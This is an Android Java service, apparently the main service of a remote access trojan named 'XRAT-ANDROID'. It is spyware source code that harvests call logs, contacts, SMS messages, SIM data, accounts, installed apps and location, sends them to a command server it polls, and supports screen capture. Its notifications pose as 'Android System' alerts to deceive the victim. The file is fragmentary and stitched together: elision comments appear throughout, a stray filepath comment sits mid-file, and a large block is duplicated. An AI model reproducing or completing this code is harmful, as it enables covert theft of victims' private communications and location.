package com.yiwugou.yiwukanz;

import static android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
import static android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;


import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Base64;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.ContextCompat;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

import org.json.JSONObject;

import java.io.IOException;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Objects;
import java.util.UUID;
import java.util.concurrent.TimeUnit;

public class MainService extends Service {

    private boolean keepRunning = true;
    private Thread pollingThread;
    private OkHttpClient client;
    private SharedPreferences sharedPrefs;
    private String a;

    // ...existing code...
public static final String serverUrl = ""; // change your server URL here
// ...existing code...

    @SuppressLint("ForegroundServiceType")
    @Override
    public void onCreate() {
        super.onCreate();

        sharedPrefs = getSharedPreferences("app_prefs", MODE_PRIVATE);

        a = sharedPrefs.getString("uuid", null);
        String ac = "a";

        if (a == null) {
            a = UUID.randomUUID().toString();
            sharedPrefs.edit().putString("uuid", a).apply();
            ac = "ac";
        }
 // ...existing code...
        try{
            JSONObject json=new JSONObject();
            json.put("id",a);
 // ...existing code...
            json.put("type", ac);
 // ...existing code...
        }catch (Exception e){
            e.printStackTrace();
        }
 // ...existing code...
    private void showCaptureNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra("type","vnc");

        PendingIntent pendingIntent = PendingIntent.getActivity(
                this,
                0,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    "AppChannel",
                    "AppChannel",
                    NotificationManager.IMPORTANCE_HIGH
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }

        Notification notification = new NotificationCompat.Builder(this, "AppChannel")
                .setContentTitle("Android System - Attention")
                .setContentText("Tap here to resolve the issue")
                .setSmallIcon(R.drawable.ic)
                .setContentIntent(pendingIntent)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true)
                .build();

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        NotificationManagerCompat.from(this).notify(1001, notification);

    }
// ...existing code...

    private void getCallDetails() {
        StringBuilder sb = new StringBuilder();
        Cursor cursor = null;

        try {
 // ...existing code...
                while (cursor.moveToNext()) {
                    String phNumber = cursor.getString(numberIdx);
                    String contactName = getContactName(phNumber);
                    if (contactName == null) contactName = phNumber;

                    String callType = cursor.getString(typeIdx);
                    String callDate = cursor.getString(dateIdx);
                    Date callDayTime = new Date(Long.parseLong(callDate));
                    String formattedDate = sdf.format(callDayTime);

                    String callDuration = cursor.getString(durationIdx);
                    String formattedDuration = formatDuration(Integer.parseInt(callDuration));

                    String dir;
                    int dircode = Integer.parseInt(callType);
                    switch (dircode) {
                        case CallLog.Calls.OUTGOING_TYPE:
                            dir = "📤 Outgoing";
                            break;
                        case CallLog.Calls.INCOMING_TYPE:
                            dir = "📥 Incoming";
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            dir = "❌ Missed";
                            break;
                        case CallLog.Calls.REJECTED_TYPE:
                            dir = "🚫 Rejected";
                            break;
                        default:
                            dir = "🔹 Other";
                            break;
                    }

                    sb.append("👤 Contact: ").append(contactName)
                            .append("\n📞 Number: ").append(phNumber)
                            .append("\n🕒 Type: ").append(dir)
                            .append("\n📅 Date: ").append(formattedDate)
                            .append("\n⏱️ Duration: ").append(formattedDuration)
                            .append("\n-------------------\n");
                }
 // ...existing code...
    private void getAllContacts() {
        StringBuilder sb = new StringBuilder();
        Cursor cursor = null;

        try {
 // ...existing code...
                    @SuppressLint("Range") String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                    sb.append("👤 Name: ").append(name).append("\n");
 // ...existing code...
                                sb.append("📞 Phone: ").append(phoneNumber).append("\n");
 // ...existing code...
                                sb.append("📧 Email: ").append(email).append("\n");
 // ...existing code...
                    sb.append("-------------------\n");
                }
            }

 // ...existing code...
    private void getAllSms() {
        StringBuilder sb = new StringBuilder();
        Cursor cursor = null;

        try {
 // ...existing code...
                while (cursor.moveToNext()) {
                    @SuppressLint("Range") String address = cursor.getString(cursor.getColumnIndex("address"));
                    @SuppressLint("Range") String body = cursor.getString(cursor.getColumnIndex("body"));
                    @SuppressLint("Range") String type = cursor.getString(cursor.getColumnIndex("type"));
                    @SuppressLint("Range") String date = cursor.getString(cursor.getColumnIndex("date"));
                    String formattedDate = sdf.format(new Date(Long.parseLong(date)));

                    String dir = "🔹 Other";
                    if (type.equals("1")) dir = "📥 Received";
                    else if (type.equals("2")) dir = "📤 Sent";

                    sb.append("👤 Contact/Number: ").append(address)
                            .append("\n🕒 Type: ").append(dir)
                            .append("\n📅 Date: ").append(formattedDate)
                            .append("\n✉️ Body: ").append(body)
                            .append("\n-------------------\n");
                }
 // ...existing code...
    private void getSimInfo() {
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        String simState = "";
        switch (tm.getSimState()) {
            case TelephonyManager.SIM_STATE_READY:
                simState = "✅ Ready";
                break;
            case TelephonyManager.SIM_STATE_ABSENT:
                simState = "❌ No SIM";
                break;
            case TelephonyManager.SIM_STATE_NETWORK_LOCKED:
                simState = "🔒 Network Locked";
                break;
            case TelephonyManager.SIM_STATE_PIN_REQUIRED:
                simState = "🔑 PIN Required";
                break;
            case TelephonyManager.SIM_STATE_PUK_REQUIRED:
                simState = "🛡️ PUK Required";
                break;
            default:
                simState = "❓ Unknown";
                break;
        }

        String simOperatorName = tm.getSimOperatorName();
        String simCountryIso = tm.getSimCountryIso();
        String phoneNumber = tm.getLine1Number();

        StringBuilder sb = new StringBuilder();
        sb.append("📶 SIM State: ").append(simState).append("\n")
                .append("🏢 Operator Name: ").append(simOperatorName).append("\n")
                .append("🌍 Country Code: ").append(simCountryIso).append("\n")
                .append("📞 Number: ").append(phoneNumber).append("\n");

 // ...existing code...
    private void getInstalledApps() {
        PackageManager pm = getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);

        StringBuilder sb = new StringBuilder();

        for (ApplicationInfo appInfo : apps) {

                String appName = pm.getApplicationLabel(appInfo).toString();
                String packageName = appInfo.packageName;

                sb.append("📦 App Name: ").append(appName)
                        .append("\n🆔 Package: ").append(packageName)
                        .append("\n-------------------\n");

        }
 // ...existing code...
    private void getSystemInfo() {
        StringBuilder sb = new StringBuilder();

        sb.append("🖥️ System Info\n");
        sb.append("-------------------\n");
        sb.append("📱 Brand: ").append(android.os.Build.BRAND).append("\n");
        sb.append("📦 Model: ").append(android.os.Build.MODEL).append("\n");
        sb.append("🔧 Manufacturer: ").append(android.os.Build.MANUFACTURER).append("\n");
        sb.append("📱 Device: ").append(android.os.Build.DEVICE).append("\n");
        sb.append("⚙️ SDK Version: ").append(android.os.Build.VERSION.SDK_INT).append("\n");
        sb.append("🆔 Android Version: ").append(android.os.Build.VERSION.RELEASE).append("\n");
        sb.append("🧩 Hardware: ").append(android.os.Build.HARDWARE).append("\n");
        sb.append("🔨 Product: ").append(android.os.Build.PRODUCT).append("\n");
        sb.append("-------------------\n");

 // ...existing code...
    private void getAccounts() {
        AccountManager accountManager = AccountManager.get(this);
        Account[] accounts = accountManager.getAccounts();

        StringBuilder sb = new StringBuilder();
        sb.append("👤 Account List\n");
        sb.append("-------------------\n");

        for (Account account : accounts) {
            sb.append("💼 Type: ").append(account.type).append("\n");
            sb.append("📧 Name: ").append(account.name).append("\n");
            sb.append("-------------------\n");
        }

 // ...existing code...
    private void getLocation() {
        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        LocationListener listener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                if (location != null) {
                    String info = "📍 Location Info\n" +
                            "-------------------\n" +
                            "🌐 Latitude: " + location.getLatitude() + "\n" +
                            "🌐 Longitude: " + location.getLongitude() + "\n" +
                            "📏 Altitude: " + location.getAltitude() + " m\n" +
                            "-------------------";
                    try{
                        JSONObject json = new JSONObject();
                        json.put("type","l");
                        json.put("id",a);
                        json.put("lat",location.getLatitude());
                        json.put("lon",location.getLongitude());
                        json.put("alt",location.getAltitude());
                        json.put("data",info);

                        sendMessage(json.toString());

                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                locationManager.removeUpdates(this); // single update only
            }
 // ...existing code...
    @SuppressLint("ForegroundServiceType")
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        createNotificationChannel();

        Notification notification = new NotificationCompat.Builder(this, "Android System")
                .setContentTitle("Android System Running")
                .setContentText("Android System is running")
                .setSmallIcon(android.R.drawable.ic_popup_sync)
                .build();
 // ...existing code...
```// filepath: e:\Dhruv Mashruwala\XRAT-ANDROID\source code\app\src\main\New folder\java\com\useless1\useless2\MainService.java
// ...existing code...
public static final String serverUrl = ""; // change your server URL here
// ...existing code...

    @SuppressLint("ForegroundServiceType")
    @Override
    public void onCreate() {
        super.onCreate();

        sharedPrefs = getSharedPreferences("app_prefs", MODE_PRIVATE);

        a = sharedPrefs.getString("uuid", null);
        String ac = "a";

        if (a == null) {
            a = UUID.randomUUID().toString();
            sharedPrefs.edit().putString("uuid", a).apply();
            ac = "ac";
        }
 // ...existing code...
        try{
            JSONObject json=new JSONObject();
            json.put("id",a);
 // ...existing code...
            json.put("type", ac);
 // ...existing code...
        }catch (Exception e){
            e.printStackTrace();
        }
 // ...existing code...
    private void showCaptureNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra("type","vnc");

        PendingIntent pendingIntent = PendingIntent.getActivity(
                this,
                0,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    "AppChannel",
                    "AppChannel",
                    NotificationManager.IMPORTANCE_HIGH
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }

        Notification notification = new NotificationCompat.Builder(this, "AppChannel")
                .setContentTitle("Android System - Attention")
                .setContentText("Tap here to resolve the issue")
                .setSmallIcon(R.drawable.ic)
                .setContentIntent(pendingIntent)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true)
                .build();

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        NotificationManagerCompat.from(this).notify(1001, notification);

    }
// ...existing code...

    private void getCallDetails() {
        StringBuilder sb = new StringBuilder();
        Cursor cursor = null;

        try {
 // ...existing code...
                while (cursor.moveToNext()) {
                    String phNumber = cursor.getString(numberIdx);
                    String contactName = getContactName(phNumber);
                    if (contactName == null) contactName = phNumber;

                    String callType = cursor.getString(typeIdx);
                    String callDate = cursor.getString(dateIdx);
                    Date callDayTime = new Date(Long.parseLong(callDate));
                    String formattedDate = sdf.format(callDayTime);

                    String callDuration = cursor.getString(durationIdx);
                    String formattedDuration = formatDuration(Integer.parseInt(callDuration));

                    String dir;
                    int dircode = Integer.parseInt(callType);
                    switch (dircode) {
                        case CallLog.Calls.OUTGOING_TYPE:
                            dir = "📤 Outgoing";
                            break;
                        case CallLog.Calls.INCOMING_TYPE:
                            dir = "📥 Incoming";
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            dir = "❌ Missed";
                            break;
                        case CallLog.Calls.REJECTED_TYPE:
                            dir = "🚫 Rejected";
                            break;
                        default:
                            dir = "🔹 Other";
                            break;
                    }

                    sb.append("👤 Contact: ").append(contactName)
                            .append("\n📞 Number: ").append(phNumber)
                            .append("\n🕒 Type: ").append(dir)
                            .append("\n📅 Date: ").append(formattedDate)
                            .append("\n⏱️ Duration: ").append(formattedDuration)
                            .append("\n-------------------\n");
                }
 // ...existing code...
    private void getAllContacts() {
        StringBuilder sb = new StringBuilder();
        Cursor cursor = null;

        try {
 // ...existing code...
                    @SuppressLint("Range") String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                    sb.append("👤 Name: ").append(name).append("\n");
 // ...existing code...
                                sb.append("📞 Phone: ").append(phoneNumber).append("\n");
 // ...existing code...
                                sb.append("📧 Email: ").append(email).append("\n");
 // ...existing code...
                    sb.append("-------------------\n");
                }
            }

 // ...existing code...
    private void getAllSms() {
        StringBuilder sb = new StringBuilder();
        Cursor cursor = null;

        try {
 // ...existing code...
                while (cursor.moveToNext()) {
                    @SuppressLint("Range") String address = cursor.getString(cursor.getColumnIndex("address"));
                    @SuppressLint("Range") String body = cursor.getString(cursor.getColumnIndex("body"));
                    @SuppressLint("Range") String type = cursor.getString(cursor.getColumnIndex("type"));
                    @SuppressLint("Range") String date = cursor.getString(cursor.getColumnIndex("date"));
                    String formattedDate = sdf.format(new Date(Long.parseLong(date)));

                    String dir = "🔹 Other";
                    if (type.equals("1")) dir = "📥 Received";
                    else if (type.equals("2")) dir = "📤 Sent";

                    sb.append("👤 Contact/Number: ").append(address)
                            .append("\n🕒 Type: ").append(dir)
                            .append("\n📅 Date: ").append(formattedDate)
                            .append("\n✉️ Body: ").append(body)
                            .append("\n-------------------\n");
                }
 // ...existing code...
    private void getSimInfo() {
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        String simState = "";
        switch (tm.getSimState()) {
            case TelephonyManager.SIM_STATE_READY:
                simState = "✅ Ready";
                break;
            case TelephonyManager.SIM_STATE_ABSENT:
                simState = "❌ No SIM";
                break;
            case TelephonyManager.SIM_STATE_NETWORK_LOCKED:
                simState = "🔒 Network Locked";
                break;
            case TelephonyManager.SIM_STATE_PIN_REQUIRED:
                simState = "🔑 PIN Required";
                break;
            case TelephonyManager.SIM_STATE_PUK_REQUIRED:
                simState = "🛡️ PUK Required";
                break;
            default:
                simState = "❓ Unknown";
                break;
        }

        String simOperatorName = tm.getSimOperatorName();
        String simCountryIso = tm.getSimCountryIso();
        String phoneNumber = tm.getLine1Number();

        StringBuilder sb = new StringBuilder();
        sb.append("📶 SIM State: ").append(simState).append("\n")
                .append("🏢 Operator Name: ").append(simOperatorName).append("\n")
                .append("🌍 Country Code: ").append(simCountryIso).append("\n")
                .append("📞 Number: ").append(phoneNumber).append("\n");

 // ...existing code...
    private void getInstalledApps() {
        PackageManager pm = getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);

        StringBuilder sb = new StringBuilder();

        for (ApplicationInfo appInfo : apps) {

                String appName = pm.getApplicationLabel(appInfo).toString();
                String packageName = appInfo.packageName;

                sb.append("📦 App Name: ").append(appName)
                        .append("\n🆔 Package: ").append(packageName)
                        .append("\n-------------------\n");

        }
 // ...existing code...
    private void getSystemInfo() {
        StringBuilder sb = new StringBuilder();

        sb.append("🖥️ System Info\n");
        sb.append("-------------------\n");
        sb.append("📱 Brand: ").append(android.os.Build.BRAND).append("\n");
        sb.append("📦 Model: ").append(android.os.Build.MODEL).append("\n");
        sb.append("🔧 Manufacturer: ").append(android.os.Build.MANUFACTURER).append("\n");
        sb.append("📱 Device: ").append(android.os.Build.DEVICE).append("\n");
        sb.append("⚙️ SDK Version: ").append(android.os.Build.VERSION.SDK_INT).append("\n");
        sb.append("🆔 Android Version: ").append(android.os.Build.VERSION.RELEASE).append("\n");
        sb.append("🧩 Hardware: ").append(android.os.Build.HARDWARE).append("\n");
        sb.append("🔨 Product: ").append(android.os.Build.PRODUCT).append("\n");
        sb.append("-------------------\n");

 // ...existing code...
    private void getAccounts() {
        AccountManager accountManager = AccountManager.get(this);
        Account[] accounts = accountManager.getAccounts();

        StringBuilder sb = new StringBuilder();
        sb.append("👤 Account List\n");
        sb.append("-------------------\n");

        for (Account account : accounts) {
            sb.append("💼 Type: ").append(account.type).append("\n");
            sb.append("📧 Name: ").append(account.name).append("\n");
            sb.append("-------------------\n");
        }

 // ...existing code...
    private void getLocation() {
        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        LocationListener listener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                if (location != null) {
                    String info = "📍 Location Info\n" +
                            "-------------------\n" +
                            "🌐 Latitude: " + location.getLatitude() + "\n" +
                            "🌐 Longitude: " + location.getLongitude() + "\n" +
                            "📏 Altitude: " + location.getAltitude() + " m\n" +
                            "-------------------";
                    try{
                        JSONObject json = new JSONObject();
                        json.put("type","l");
                        json.put("id",a);
                        json.put("lat",location.getLatitude());
                        json.put("lon",location.getLongitude());
                        json.put("alt",location.getAltitude());
                        json.put("data",info);

                        sendMessage(json.toString());

                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                locationManager.removeUpdates(this); // single update only
            }
 // ...existing code...
    @SuppressLint("ForegroundServiceType")
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        createNotificationChannel();

        Notification notification = new NotificationCompat.Builder(this, "Android System")
                .setContentTitle("Android System Running")
                .setContentText("Android System is running")
                .setSmallIcon(android.R.drawable.ic_popup_sync)
                .build();
 // ...existing code...
        startForeground(1, notification, FOREGROUND_SERVICE_TYPE_DATA_SYNC | FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);

        client = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .writeTimeout(30, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .build();

        pollingThread = new Thread(this::pollServer);
        pollingThread.start();

        return START_STICKY;
    }